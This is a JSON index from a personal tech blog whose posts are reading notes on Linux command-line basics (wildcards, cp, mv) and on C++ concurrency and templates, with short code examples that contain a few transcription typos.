Engineering","slug":"Reverse-Engineering","permalink":"https://iss4cf0ng.github.io/tags/Reverse-Engineering/"},{"name":"OllyDbg","slug":"OllyDbg","permalink":"https://iss4cf0ng.github.io/tags/OllyDbg/"},{"name":"WinDbg","slug":"WinDbg","permalink":"https://iss4cf0ng.github.io/tags/WinDbg/"},{"name":"Assembly","slug":"Assembly","permalink":"https://iss4cf0ng.github.io/tags/Assembly/"},{"name":"MD5","slug":"MD5","permalink":"https://iss4cf0ng.github.io/tags/MD5/"},{"name":"AES","slug":"AES","permalink":"https://iss4cf0ng.github.io/tags/AES/"}],"keywords":[]},{"title":"[Book] Practical Linux Forenics","slug":"2026-1-14-BookPracticalLinuxForensics","date":"2026-01-14T06:05:22.000Z","updated":"2026-02-20T17:53:17.250Z","comments":true,"path":"2026/01/14/2026-1-14-BookPracticalLinuxForensics/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/14/2026-1-14-BookPracticalLinuxForensics/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “Practical Linux Forenics”.The content will be continuously updated as I read through the book.","categories":[],"tags":[],"keywords":[]},{"title":"[Book] How Linux Works - WHAT EVERY SUPERUSER SHOULD KNOW","slug":"2026-1-14-BookLinuxSuperUser","date":"2026-01-14T06:01:33.000Z","updated":"2026-02-20T17:54:00.314Z","comments":true,"path":"2026/01/14/2026-1-14-BookLinuxSuperUser/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/14/2026-1-14-BookLinuxSuperUser/","excerpt":"","text":"El Libro IntroductionThis article is used to keep notes and summaries of the book “How Linux Works - WHAT EVERY SUPERUSER SHOULD KNOW (2nd Edition)”.The content will be continuously updated as I read through the book. Reflection","categories":[],"tags":[],"keywords":[]},{"title":"[Book] The Linux Command Line (2nd Edition)","slug":"2026-1-14-BookLinuxCommand","date":"2026-01-14T06:00:54.000Z","updated":"2026-02-20T17:53:36.066Z","comments":true,"path":"2026/01/14/2026-1-14-BookLinuxCommand/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/14/2026-1-14-BookLinuxCommand/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “The Linux Command Line (3rd Edition)”.The content will be continuously updated as I read through the book. ReflectionChapter 4 - Manipulating Files and Directories1cp -u *.html destination Wildcards Wildcard Meaning * Matches any characters ? Matches any single character [characters] Matches any character that is a member if the set characters [!characters] Matches any character that is not a member of the set characters [[:class:]] Matches any character that is a member of the specified class Commonly Used Character Classes Character class Meaning [:alnum:] Matches any alphanumeric character [:alpha:] Matches any alphabetic character [:digit:] Matches any numeral [:lower:] Matches any lowercase letter [:upper:] Matches any uppercase letter Pattern Matches * All files g* Any file beginning with g b*.txt Any file beginning with b followed by any characters and ending with .txt Data??? Any file beginning with Data followed by exactly three characters [abc]* Any file beginning with either an a, a b, or a c BACKUP.[0-9][0-9][0-9] Any file beginning with BACKUP. followed by exactly three numerals [[:upper:]]* Any file beginning with an uppercase letter [![:digit:]]* Any file not beginning with a numeral *[[:lower:]123] Any file ending with a lowercase letter or the numerals 1, 2, or 3 mkdir1mkdir dir1 dir2 dir3 cp1cp item... directory Useful options and Examples: Option Meaning -a, --archive Copy the files and directories and all of their attributes, including ownerships and permissions. Normally, copies take on the default attributes of the user performing the copy. -i, --interactive Before overwriting an existing file, prompt the user for confirmation. If this option is not specified, cp will silently overwrite files. -r, --recursive Recursively copy directories and their contents. This option (or the -a option) is required when copying directories. -u, --update When copying files from one directory to another, only copy files that either don’t exist or are newer than the existing corresponding files in the destination directory. Useful for skipping unnecessary copies. -v, --verbose Display informative messages as the copy is performed. Command Results cp file1 file2 Copy file1 to file2. If file2 exists, it is overwritten with the contents of file1. If file2 does not exist, it is created. cp -i file1 file2 Same as the previous command, except that if file2 exists, the user is prompted before it is overwritten. cp file1 file2 dir1 Copy file1 and file2 into directory dir1. The directory dir1 must already exist. cp dir1/* dir2 Using a wildcard, copy all the files in dir1 into dir2. The directory dir2 must already exist. cp -r dir1 dir2 Copy the contents of directory dir1 to directory dir2. If dir2 does not exist, it is created and will contain the same contents as dir1. If dir2 does exist, then dir1 (and its contents) will be copied into dir2. mvUseful Options and Examples: Option Meaning -i, --interactive Before overwriting an existing file, prompt the user for confirmation. If this option is not specified, mv will silently overwrite files. -u, --update When moving files from one directory to another, only move files that either don’t exist or are newer than the existing corresponding files in the destination directory. -v, --verbose Display informative messages as the move is performed. Command Results mv file1 file2 Move file1 to file2. If file2 exists, it is overwritten with the contents of file1. If file2 does not exist, it is created. In either case, file1 ceases to exist. mv -i file1 file2 Same as the previous command, except that if file2 exists, the user is prompted before it is overwritten. mv file1 file2 dir1 Move file1 and file2 into directory dir1. The directory dir1 must already exist. mv dir1 dir2 If directory dir2 does not exist, create directory dir2 and move the contents of directory dir1 into dir2, then delete directory dir1. If directory dir2 does exist, move directory dir1 (and its contents) into directory dir2. Chapter 6 - RedirectionStandard Input, Output and ErrorPipelineChapter 9 - PermissionsChapter 15 - Storage MediaChapter 16 - NetworkingChapter 18 - Archiving and BackupChapter 19 - Regular ExpressionChapter 23 - Compiling ProgramsChapter 24 - Writing Your First ScriptChapter 25 - Starting a Project","categories":[],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Linux","slug":"Linux","permalink":"https://iss4cf0ng.github.io/tags/Linux/"},{"name":"Command Line","slug":"Command-Line","permalink":"https://iss4cf0ng.github.io/tags/Command-Line/"},{"name":"Linux Command","slug":"Linux-Command","permalink":"https://iss4cf0ng.github.io/tags/Linux-Command/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Study","slug":"Study","permalink":"https://iss4cf0ng.github.io/tags/Study/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"}],"keywords":[]},{"title":"[Book] Designing Anonymous Communication Chains for Offensive and Defensive Cybersecurity","slug":"2026-1-14-BookDesigningAnonymousCommChains","date":"2026-01-13T16:55:10.000Z","updated":"2026-01-23T03:07:28.133Z","comments":true,"path":"2026/01/14/2026-1-14-BookDesigningAnonymousCommChains/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/14/2026-1-14-BookDesigningAnonymousCommChains/","excerpt":"","text":"El libro IntroductionReflection","categories":[],"tags":[],"keywords":[]},{"title":"[Book] Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e","slug":"2026-1-9-BookLinuxFirewall","date":"2026-01-08T16:56:53.000Z","updated":"2026-01-09T12:42:30.925Z","comments":true,"path":"2026/01/09/2026-1-9-BookLinuxFirewall/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/09/2026-1-9-BookLinuxFirewall/","excerpt":"","text":"El Libro IntroductionThis article is used to keep notes and summaries of the book “Linux Firewalls: Enhancing Security with nftables and Beyond, 4/e”.The content will be continuously updated as I read through the book.","categories":[],"tags":[],"keywords":[]},{"title":"[Book] C++ Concurrency In Action (Second Edition)","slug":"2026-1-8-BookCppConcurrencyInAction2ed","date":"2026-01-08T11:14:40.000Z","updated":"2026-02-17T07:02:57.652Z","comments":true,"path":"2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/08/2026-1-8-BookCppConcurrencyInAction2ed/","excerpt":"","text":"El Libro IntroductionThis article is used to keep notes and summaries of the book “C++ Concurrency In Action (Second Edition)”.The content will be continuously updated as I read through the book. ReflectionChapter.1 - Hello, world of concurrency1.1 - What is concurrencyAt the simplest and most basic level, concurrency is about two or more separate activities happening at the same time. You can watch football while I go swimming, and so on. When we talk about concurrency in terms of computers, we mean a single system performing multiple independent activities in parallel, rather than sequentially, or one after the other. Concurrency vs. ParallelismConcurrency and parallelism have largely overlapping meanings with respect to multithreaded code. Indeed, to many they mean the same thing. The difference is primarily a matter of nuance, focus, and intent. Both terms are about running multiple tasks simultaneously, using the available hardware, but parallelism is much more performance-oriented. People talk about parallelism when their primary concern is talking advantage of the avaiable hardware to increase the performance of bulk data processing. People talk about concurrency when their primary concern is separation of concerns, or responsiveness. 1.4 - Getting Started12345678910111213#include &lt;iostream&gt;#include &lt;thread&gt;void hello()&#123; std::cout &lt;&lt; &quot;Hello concurrent world.\\n;&#125;int main()&#123; std::thread t(hello); t.join();&#125; Every thread has to have an initial function, where the new thread of execution begins. For the initial thread in an application, this is main(), but for every other thread it’s specified in the constructor of a std::thread object——in this case, the std::thread objecct named t has the new hellow() function as its initial function. With join(), the program possibily ends before the new thread had a chance to run. Chapter.2 - Managing threads2.1 - Basic thread managementEvery C++ program has at least one thread, which is started by the C++ runtime: the thread running main(). 1234567891011class background_task&#123;public: void operator()() const &#123; do_something(); do_something_else(); &#125;&#125;;background_task f;std::thread my_thread(f); 1std::thread my_thread(background_task()); One type of callable object that avoids this problem is a lambda expression. This is a new feature from C++11:1234std::thread my_thread([] &#123; do_something(); do_something_else();&#125;) 1234567891011121314151617181920struct func&#123; int&amp; i; func(int&amp; i_): i(_)&#123;&#125; void operator()() &#123; for (unsigned j = 0; j &lt; 10000000; ++j) &#123; do_something(i); &#125; &#125;&#125;;void oops()&#123; int some_local_state=0; func my_func(some_local_state); std::thread my_thread(my_func); my_thread.detach();&#125; In this case, the new thread associated with my_thread will probably still be running when oops exists, because you’ve explicitly decided not to wait for it by calling detach(). The program will be terminated if detach() isn’t called. If the thread is still running, you have this scenario: the nexst call to do_something(i) will access an already destroyed variable. This is like normal single-threaded code——allowing a pointer or reference to a local variable to persist beyond the function exit is never a good idea——but it’s earier to make the mistake with multithreaded code, because it isn’t necessarily immediately apparent that this has happened. In particular, it’s a bad idea to create a thread within a function that has access to the local variables in that function, unless the thread is guarateed to finish before the function exits. 12345678910111213141516171819struct func;void f()&#123; int some_local_state = 0; func my_func(some_local_state); std::thread t(my_func); try &#123; do_something_in_current_thread(); &#125; catch (...) &#123; t.join(); throw; &#125; t.join();&#125; 2.2 - Passing arguments to a thread function123void f(int i, std::string const&amp; s);std::thread t(f, 3, &quot;hello&quot;); Note that even though f takes a std::string as the second parameter, the string literal is passwd as a char const* and converted to a std::string only in the context of the new thread. This is particularly important when the argument supplied is a pointer to an automatic variable, as follows:12345678void f(int i, std::string const&amp; s);void oops(int some_param)&#123; char buffer[1024]; sprintf(buffer, &quot;%i%, some_param); std::thread t(f, 3, buffer); t.detach();&#125;In this case, it’s the pointer to the local variable buffer that’s passed through to the new thread and there’s a significant chance that the oops function will exit before the buffer has been converted to a std::string on the new thread, thus leading to undefined behavior. This solution is to cast to std::string before passing the buffer to the std::thread constructor:12345678void f(int i, std::string const&amp; s);void oops(int some_param)&#123; char buffer[1024]; sprintf(buffer, &quot;%i%, some_param); std::thread t(f, 3, std::string(buffer)); t.detach();&#125; 2.3 - Transferring ownership of a thread12345678void some_function();void some_other_function();std::thread t1(some_function);std::thread t2 = std::move(t1);t1 = std::thread(some_other_function);std::thread t3;t3 = std::move(t2);t1 = std::move(t3); //This assignment will terminate the program! First, a new thread is started and associated with t1. Ownership is then transferred over to t2 when t2 is constructed, by invoking std::move() to explicitly move ownership. At this point, t1 no longer has an associated thread of execution; the thread running some_function is now associated with t2. The final move tansfers ownership of the thread running some_function back to t1 where it started. But in this case t1 already had an associated thread (which was running some_other_function), so std::terminate() is called to terminated the program. You cannot just drop a thread by assigning a new value to the std::thread object that manages it. 123456789101112std::thread f()&#123; void some_function(); return std::thread(some_function);&#125;std::thread g()&#123; void some_other_function(int); std::thread t(some_other_function, 42); return t;&#125; Likewise, if ownership should be transferred into a function, it can accept an instance of std::thread by value as one of the parameters, as shown here:123456789void f(std::thread t);void g()&#123; void some_function(); f(std::thread(some_function)); std::thread t(some_function); f(std::move(t));&#125; 1234567891011121314151617181920212223242526class scoped_thread&#123; std::thread t;public: explicit scoped_thread(std::thread t_): t(std::move(t_)) &#123; if (!t.joinable()) throw std::logic_error(&quot;No thread&quot;); &#125; ~scoped_thread() &#123; t.join(); &#125; scoped_thread(scoped_thread const&amp;) = delete; scoped_thread&amp; operator=(scoped_thread const&amp;)=delete;&#125;;struct func;void f()&#123; int some_local_state; scoped_thread t&#123;std::thread(func(some_local_state))&#125;; do_something_in_current_thread();&#125;123456789101112void do_work(unsigned id);void f()&#123; std::vector&lt;std::thread&gt; threads; for (unsigned i = 0; i &lt; 20; ++i) &#123; threads.emplace_back(do_work, i); &#125; for (auto&amp; entry: threads) entry.join();&#125; 2.5 - Identifying threads12345678910std::thread::id master_thread;void some_core_part_of_algorithm()&#123; if (std::this_thread::get_id() == master_thread) &#123; do_master_thread_work(); &#125; do_common_work();&#125; Chapter.3 - Sharing data between threadsIf you’re sharing data between threads, you need to have rules for which thread can access which bit of data when, and how any updates are communicated to the other threads that care about the data. Incorrect use of shared data is one of the biggest causes of concurrency-related bugs, and the consequence can be serious. 3.1 - Problems with sharing data between threadsThe probles with sharing data between threads are all due to the consequences of modifying data. If all shared data is read-only, there’s no problem, because the data read by on thread is unaffected by whether or not another thread is reading the same data. Once concept that’s widely used to help programmers reason about their code is invariants——statements that are always true about a particular data struct, such as “this variable contains” the number of items in the list.” This invariants are often broken during an update, especially if the data structure is of any complexity or the update requires modification of more than one value. Race conditionsIn concurrency, a race condition is anything where the outcome depends on the relative ordering of execution of operations on two or more threads; the threads race to perform their respective operations. This term is usually used to mean a problematic race condition. The C++ standard also defines the term data race to mean the specific type of race condition; data races cause the dreaded undefined behavior. Avoiding problematic race conditionsThe simplest option is to wrap your data structure with a protection mechanism to ensure that only the thread performing a modification can see the intermediate states where the invariants are broken. We can use memory model, lock-free to solve this problem. 3.2 - Protecting shared data with mutexesMutex stands for Mutual Exclusion. Before accessing a shared data structure, you lock the mutex associated with that data, and when you’ve finished accessing the data structure, you unlock the mutex. Mutexes are the most general of the data-rpotection mechanisms available in C++, but they’re not a silver bullet; it’s important to structure your code to protect in right data and avoid race conditions inherent in your interfaces. Mutexes also come with their own problems in the form of a deadlock and protecting either too much or too little data. Using mutexes in C++123456789101112131415161718#include &lt;mutex&gt;#include &lt;algorithm&gt;std::list&lt;int&gt; some_list;std::mutex some_mutex;void add_to_list(int new_value)&#123; std::lock_guard&lt;std::mutex&gt; guard(some_mutex); some_list.push_back(new_value);&#125;bool list_contains(int value_to_find)&#123; std::lock_guard&lt;std::mutex&gt; guard(some_mutex); return std::find(some_list.begin(),some_list.end(),value_to_find) != some_list.end();&#125; If one of he member functions returns a pointer or reference to the protected data, then it doesn’t matter that the member functions all lock the mutex in a nice, orderly fashion, because you’ve blown a big hole in the protection. **Any code that has access to that pointer or reference can now access (and potentially modify) the protected data without locking the mutex. Protecting data with mutex therefore requires careful interface design to ensure that the mutex is locked befored there’s any access to the protected data and that there are no backdoor. Structuring code for protecting shared dataProtecting data with mutex is not quite as easy as slapping an std::guard object in every member function; one stray pointer or reference, and all that protection is for nothing. As well as checking that the member functions don’t pass out pointers or references to their callers, it’s also important to check that they don’t pass there pointers or references IN to functions they call that arent’s under you control, this is dangerous.123456789101112131415161718192021222324252627282930313233class some_data&#123; int a; std::string b;public: void do_something();&#125;;class data_wrapper&#123;private: some_data data; std::mutex m;public: template&lt;typename Function&gt; void process_data(Function func) &#123; std::lock_guard&lt;std::mutex&gt; l(m); func(data); &#125;&#125;;some_data* unprotected;void malicious_function(some_data&amp; protected_data)&#123; unprotected=&amp;protected_data;&#125;data_wrapper x;void foo()&#123; x.process_data(malicious_function); upprotected-&gt;do_something();&#125;In this example, the code in process_data looks harmless enough, nicely protected with std::lock_guard, but the call to the user-supplied func function means that foo can pass in malicious_function to bypass the protection and then call do_something() without the mutex being locked. Guidline: Don’t pass pointers and references to protected data outside the scope of the lock, whether by returning them from a function, storing them in externally visible memory, or passing them as arguments to user-supplied functions. Just because you’re using a mutex or other mechanism to protect shared data, it doesn’t mean you’re protected from race conditions; you still have to ensure that the appropriate data is protected. Consider the doubly linked list example. If you protected access to the pointers of each node individually, you’d be no better off than with code that used no mutexes, because the race condition could still happen——it’s not the individual nodes that need protecting for the individual steps but the whole data structure, for the whole delete operation. The easiest solution in this case is to have a single mutex that protects the entire list. Deadlock: the problem and a solutionImagine a pair of threads arguing over locks on mutexes: each of a pair of threads needs to lock both of a pair of mutexes to perform some operation, and each thread has one mutex and is waiting for the other. Neither thread can proceed, because each is waiting for the other to release its mutex. This scenario is called deadlock, and it’s the biggest problem with having to lock two or more mutexes in order to perform an operation. The common advice for avoiding deadlock is to always lock the two mutexes in the same order. The C++ Standard Library has a cure for this in the form of std::lock——a function that can lock two or more mutexes at once without risk of deadlock. 123456789101112131415161718192021class some_big_object;void swap(some_big_object&amp; lhs, some_big_object&amp; rhs);class X&#123;private: some_big_object some_detail; std::mutex m;public: X(some_big_object const&amp; sd): some_detail(sd) &#123;&#125; friend void swap(X&amp; lhs, X&amp; rhs) &#123; if (&amp;lhs==&amp;rhs) return; std::lock(lhs.m, rhs.m); std::lock_guard&lt;std::mutex&gt; lock_a(lhs.m, std::adopt_lock); std::lock_guard&lt;std::mutex&gt; lock_b(rhs.m, std::adopt_lock); swap(lhs.some_detail, rhs.some_detail); &#125;&#125;; First, the arguments are checked to ensure they are different instances, because attempting to acquire a lock on std::mutex when you already hold it is undefined behavior (A mutex that does permit multiple locks by the same thread is provided in the form of std::recursive_mutex.).Then, the call to std::lock() locks the two mutexes, and two std::lock_guard instances are constructed and, one for each mutex.The std::adopt_lock parameter is supplied in addition to the mutex to indicate to the std::lock_guard objects that the mutexes are already locked, and they should adopt the ownership of the existing lock on the mutex rather than attempt to lock the mutex in the constructor. C++17 provides additional support for this scenario, in the form of a new RAII termplate, std::scoped_lock&lt;&gt;. This is exactly equivalent to std::lock_guard&lt;&gt;, except that it is a variadic template, accepting a list of mutex types as template parameters, and a list of mutexes as constructor arguments. The mutexes supplied to the constructor are locked using the same algorithm as std::lock, so that when the constructor completes they are all locked, and they are then all unlocked in the destructor.1234567void swap(X&amp; lhs, X&amp; rhs)&#123; if(&amp;lhs==&amp;rhs) return; std::scoped_lock guard(lhs.m,rhs.m); swap(lhs.some_detail,rhs.some_detail);&#125;This example uses another feature added with C++17: automatic deduction of class template parameters.This line is equivalent to the equivalent to the fully specified version:1std::scoped_lock&lt;std::mutex, std::mutex&gt; guard(lhs.m, rhs.m); The existence of std::scoped_lock means that most of the cases where you would have used std::lock prior to C++17 can now be written using std::scoped_lock, with less potential for mistakes. You have to rely on your discipline as developers to ensure you don’t get get deadlock. This isn’t easy: deadlocks are one of the nastiest problems to encounter in multithreaded code and are often unpredictable, with everything working fine the majority of the time. Futher guidlines for avoiding deadlockDeadlock doesn’t only occur with locks. You can create deadlock with two threads and no locks by having each thread call join() on the std::thread object for the other. In this case, neither thread can make progress because it’s waiting for the other to finish. The guidlines for avoiding deadlock all boil down to one idea: don’t wait for another thread if there’s a chance it’s waiting for you. Avoid nested locks:Don’t acquire a lock if you already hold one. If you stick to this guidline, it’s impossible to get a deadlock from the lock usage alone because each thread only ever holds a single lock. You should still get deadlock from other things (like the threads waiting for each other), but mutex locks are probably the most common cause of deadlock. Avoid calling user-suplied code while holding a lock:This is a simple follow-on from the previous guidline. Because the code is user-supplied, you have no idea what it could do; it could do anything, including acquiring a lock. Acquire locks in a fixed order:If you absolutely must acquire two or more locks, and you can’t acquire them as a single operation with std::lock, the next best thing is to acquire them in the same order in every thread. Use a lock hiearchy:Although this is a particular case of defining lock ordering, a lock hierarchy can provide a means of checking that the convention is adhered to at runtime. The idea is that you divide your application into layers and identify all the mutexes that may be locked in any given layer. Extending these guidlines beyond locks:Deadlocks also occur with any synchronization construct that can lead to a wait cycle.\\If you’re going to wait for a thread to finish, it might be worth identifying a thread hierarchy, so that a thread waits only for threads lower down the hierarchy. One simple way to do this is to ensure that your threads are joined in the same function that started them. Flexible locking with std::unique_lockOnce you’ve designed your code to avoid deadlock, std::lock() and std::lock_guard cover most of the cases of simle locking, but sometimes more flexibility is required. std::unique_lock provides a bit more flexibility than std::lock_guard by relaxing the invariants; an std::unique_lock instance doesn’t always own the mutex that it’s associated with. You can pass std::adopt_lock as a second argument to the constructor to have the lock object manage the lock on a mutex, you can also pass std::defer_lock as the second argument to indicate that the mutex should remain unlocked on construction. 1234567891011121314151617181920class some_big_object;void swap(some_big_object&amp; lhs,some_big_object&amp; rhs);class X&#123;private: some_big_object some_detail; std::mutex m;public: X(some_big_object const&amp; sd):some_detail(sd)&#123;&#125; friend void swap(X&amp; lhs, X&amp; rhs) &#123; if (&amp;lhs == &amp;rhs) return; std::unique_lock&lt;std::mutex&gt; lock_a(lhs.m, std::defer_lock); std::unique_lock&lt;std::mutex&gt; lock_b(rhs.m, std::defer_lock); std::lock(lock_a, lock_b); swap(lhs.some_detail, rhs.some_detail); &#125;&#125;; Using std::unique_lock and std::defer_lock, rather than std::lock_guard and std::adopt_lock. std::unique_lock objects could be passed to std::lock(), because std::unique_lock provides lock(), try_lock(), and unlock() member functions. Transferring mutex ownership between scopesBecause std::unique_lock instances don’t have to own their associated mutexes, the ownership of mutex can be transferred between instances by moving the instances around. Locking at an appropriate granularityThe lock granularity is a hand-waving term to describe the amount of data protected by a single lock. A fine-grained lock protects a small amount of data, and a coarse-grained lock protects a large amount of data. 3.3 - Alternative facilities for protecting shared dataChapter.4 - Synchronizing concurrent operationsSometimes you don’t just need to protect the data, you also need to synchronize actions on separate threads. One thread might need to wait for another thread to complete a task before the thread can complete its own, for example. In general, it’s common to want a thread to wait for a specific event to happen or a condition to be true. 4.1 - Waiting for an event or other conditionIf one thread is waiting for a second thread to complete a task, it has several options. First, it could keep checking a flag in shared data (protected by mutex) and have the second thread set the flag when it come pletes the task. This is wasteful on two counts: the thread consumes valuable processing time repeatedly checking the flag, and when the mutex is locked by the waiting thread, it can’t be locked by any other thread. 12345678bool flags;std::mutex m;void wait_for_flag()&#123; std::unique_lock&lt;std::mutex&gt; lk(m); std::this_thread::sleep_for(std::chrono::miliseconds(100)); lk.lock();&#125; In the loop, the function unlocks the mutex before the sleep, and locks it again afterward so another thread gets a chance to acquire it and set the flag. This is an improvement because the thread does not waste processing time while it’s sleep, but it’s hard to get the sleep period right. The third and preferred option is to use the facilities from the C++ Standard Libaray to wait for the event itself. Waiting for a condition with condition variablesThe Standard C++ Library provides two implementations of a condition variable: std::condition_variable and std::condition_variable_any. Both of these are declared in the &lt;condition_variable&gt; library header. In both cases, they need to work with a mutex in order to provide appropriate synchronization the former is limited to working with std::mutex, whereas the latter can work with anything that meets the mimimal criteria for being mutex-like, hence the _any suffix. std::condition_variable_any is more general, there’s the potential for additional consts in terms of size, performance, or OS resources, so std::condition_variable should be preferred unless the additional flexibility is required. 12345678910111213141516171819202122232425262728293031323334std::mutex mut;std::queue&lt;data_chunk&gt; data_queue;std::condition_variable data_cond;void data_preparation_thread()&#123; while (more_data_to_prepare()) &#123; data_chunk const data = prepare_data(); &#123; std::lock_guard&lt;std::mutex&gt; lk(mut); data_queue.push(data); &#125; data_cond.notify_one(); &#125;&#125;void data_processing_thread()&#123; while (true) &#123; std::unique_lock&lt;std::mutex&gt; lk(mut); data_cond.wait( lk, []&#123;return !data_queue.empty();&#125; ); data_chunk data = data_queue.front(); data_queue.pop(); lk.unlock(); process(data); if (is_last_chunk(data)) break; &#125;&#125; You have a queue that’s used to pass the data between two therads. Note that you put the code to push the data onto the queue in a smaller scope, so you notify the condition variable after unlocking the mutex. On the other side of the fence, you have the processing thread. This thread first locks the mutex, but this time with a std::unique_lock rather than a std::lock_guard. The reason is std::unique_lock is reusable. The waiting thread must unlock the mutex while it’s waiting and lock it again afterward, and std::lock_guard doesn’t provide that flexibility. Chapter.5 - The C++ memory model and operations on atomic typesThis chapter will start by convering the basic of the memory model, then move on to the atomic types and operations, and finally cover the various types of synchronization available with the operations on atomic types. 5.1 - Memory model basicObjects and memory locationsThe C++ Standard defines an object as “a region of storage”, although it goes on to assign properties to these objects, such as their type and lifetime. Whatever its type, an object is stored in one or more memory locations. Each memory location is either an object (or sub-object) of a scalar type such as unsigned short or my_class* or a sequence of adjacent bit fields. If you use bit fields, this is an important point to note: though adjacent bit fields are distinct objects, they’re still counted as the same memory location. There are four important things to take away from this: Every variable is an object, including those that are members of other objects. Every object occupies at least one memory location. Variables of fundamental types such as int or char occupy exactly one memory location, whatever their size, even if they’re adjacent or part of an array. Adjacent bit fields are part of the same memory location. Objects, memory locations and concurrencyIf two threads access separate memory locations, there’s no problem: everything works fine. On the other hand, if two threads access the same memory location, then you have to be careful.\\If neither thread is updating the memory location, you’re fine; read-only data does not need protection or synchronization.If either thread is modifying the data, there’s a potential for a race condition. Solutions: mutexes. Synchronization properties of atomic operations. If two threads access the same memory location, each pair of accesses must have a defined ordering. If there’s no enofrced ordering between two accesses to a single memory location from separate threads, one or both of those accesses is no atomic, and if one or both is a write, then this is a data race and causes undefined behavior. Modification ordersIf you do use atomic operations, the compiler is responsible for ensuring that the necessary synchronization is in place.\\This requirement means that certain kinds of speculative execution ain’t permitted, because once a thread has seen a particular entry in the modification order, subsequent reads from that thread must return laster values, and subsequent writes from that thread to that object must occur laster in the modification order. 5.2 - Atomic operations and types in C++An atomic operation is an indivisible operation. You can’t observe such an operation half-done from any thread in the system; it’s either done or not done. If the load operation that reads the value of an object is atomic, and all modifications to that object are also atomic. The flip side of this is that a non-atomic operation might be seen as half-done by another thread. If the non-atomic operation is composed of atomic operaitons (for example, assignment to struct with atomic members), then other threads may observe some sbuset of the constituent atomic operation as complete, but others as not yet started, so you might observe or end up with a value that is a mixed-up combinationof the various values stored. The standard atomic typesThe standard atomic types can be found in the &lt;atomic&gt; header. All operations on such types are atomic, and only operations on these types are atomic in the sense of the language definition, although you can use mutexes to make other operation appear atomic. This is important to know in many cases——the key use case for atomic operations is as a replacement for an operation that would otherwise use a mutex for synchronization. The library provides a set of macros to identify at compile time whether the atomic types for the various integral types are lock-free. Since C++17, all atomic types have a static constexpr member variable, X::is_always_lock_free, which is true if and only if the atomic type X is lock-free for all supported hardware that the output of the current compilation might run on. Chapter.6 - Designing lock-based concurrent data structuresChapter.7 - Designing lock-free concurrent data structures.Chapter.8 - Designing concurrent codeChapter.10 - Advanced thread management","categories":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}],"tags":[{"name":"Learning","slug":"Learning","permalink":"https://iss4cf0ng.github.io/tags/Learning/"},{"name":"Programming","slug":"Programming","permalink":"https://iss4cf0ng.github.io/tags/Programming/"},{"name":"C++","slug":"C","permalink":"https://iss4cf0ng.github.io/tags/C/"},{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/tags/Book/"},{"name":"Study","slug":"Study","permalink":"https://iss4cf0ng.github.io/tags/Study/"},{"name":"Note","slug":"Note","permalink":"https://iss4cf0ng.github.io/tags/Note/"},{"name":"Coding","slug":"Coding","permalink":"https://iss4cf0ng.github.io/tags/Coding/"},{"name":"Concurrency","slug":"Concurrency","permalink":"https://iss4cf0ng.github.io/tags/Concurrency/"}],"keywords":[{"name":"Book","slug":"Book","permalink":"https://iss4cf0ng.github.io/categories/Book/"}]},{"title":"[Book] C++ Templates - The Complete Guide (Second Edition)","slug":"2026-1-7-CppTemplatesTheCompleteGuide2ed","date":"2026-01-07T06:38:34.000Z","updated":"2026-01-15T09:22:53.607Z","comments":true,"path":"2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/","link":"","permalink":"https://iss4cf0ng.github.io/2026/01/07/2026-1-7-CppTemplatesTheCompleteGuide2ed/","excerpt":"","text":"El libro IntroductionThis article is used to keep notes and summaries of the book “C++ Templates - The Complete Guide (Second Edition)”.The content will be continuously updated as I read through the book. ReflectionChapter.1 - Function Templates1.1 - Function Templates12345template&lt;typename T&gt;T max(T a, T b)&#123; return b &lt; a ? a : b;&#125; template parameters must be announced with syntax of the following form:1template&lt;comma-separated-list of parameters&gt;Here, the type parameter is T. You can use any identifier as a parameter name, but using T is the convention. The type parameter represents an arbitrary type that is determined by the caller when the caller calls the function. For historical reasons, you can also use the keyworkd class instead of typename to define a type parameter.12345template&lt;class T&gt;T max(T a, T b)&#123; return b &lt; a ? a : b;&#125;Semantically there is no difference. However, because this use of class can be misleading(not only class types can be substituted for T), you should prefer the use of typename in this context.The keyword struct cannot be used in place of typename when declaring type parameters. Example of using max() function template:1234567891011121314151617#include &lt;iostream&gt;#include &lt;string&gt;#include &quot;max1.hpp&quot;int main()&#123; int i = 42; std::cout &lt;&lt; &quot;max(7, i): &quot; &lt;&lt; ::max(7, i) &lt;&lt; std::endl; double f1 = 3.4; double f2 = -6.7; std::cout &lt;&lt; &quot;max(f1, f2): &quot; &lt;&lt; ::max(f1, f2) &lt;&lt; std::endl; std::string s1 = &quot;mathematics&quot;; std::string s2 = &quot;math&quot;; std::cout &lt;&lt; &quot;max(s1, s2): &quot; &lt;&lt; ::max(s1, s2) &lt;&lt; std::endl;&#125;Output:123max(7,i): 42max(f1,f2): 3.4max(s1,s2): mathematicsNote that each call of the max() template is qualified with ::. This is to ensure that our max() template is found in the global namespace. This is also a std::max() template in the standard libaray, which under some circumstances may be called or maylead to ambiguity. void is a valid template argument provided the resulting code is valid:123456789template&lt;typename T&gt;T foo(T*)&#123;&#125;void *vp = nullptr;foo(vp); //OK//foo(void*); NOT OK Two-Phase TranslationAn attempt to instantiate a template for a type that doesn’t support all the operations used within it will result in a compile-time error:123std::complex&lt;flat&gt; c1, c2; //doesn&#x27;t provide operator &lt;...::max(c1, c2);templates are compiled in two phase: Without instantiation at definition time, the template code itself is checked for correctness ignoring the template parameters: Syntax errors. Using unknown names. Static assertions that don’t depend on template parameters are checked. At instantiation time, the template code is checked(again) to ensure that all code is valid. 12345678template&lt;typename T&gt;void foo(T t)&#123; undeclared(); // first-phase compile-time error if undeclared() unknown undeclared(t); // second-phase 